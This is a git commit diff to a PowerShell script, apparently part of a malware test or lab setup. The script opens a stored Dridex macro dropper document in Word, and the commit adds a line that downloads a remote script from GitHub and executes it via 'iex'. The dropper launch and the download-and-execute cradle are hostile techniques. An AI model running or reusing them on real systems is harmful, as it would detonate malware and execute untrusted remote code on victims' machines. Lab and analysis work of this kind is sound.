fd0df6d13b79d84786bcc046709ce4152bebd166
chriskossdummy <38363533+chriskossdummy@users.noreply.github.com>
2018-06-11 16:08:13 -0700

    Update remote.ps1

--- remote.ps1
+++ remote.ps1
@@ -2,10 +2,7 @@ Write-Output "Hello World! -- written remote script downloaded from github"
 
 Start-Process winword.exe C:\Users\IEUser\Downloads\malicious_documents_samples\malicious_document_macro_dridex\dridexDropper.doc
 
-Add-Type -AssemblyName System.Windows.Forms
-$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
 Start-Sleep -Seconds 2
-[Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(900,80)
-Start-Sleep -Seconds 2
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/chriskossdummy/miscscripts/master/enable.ps1")
 
 Write-Output "Goodbye World -- remote execution complete"
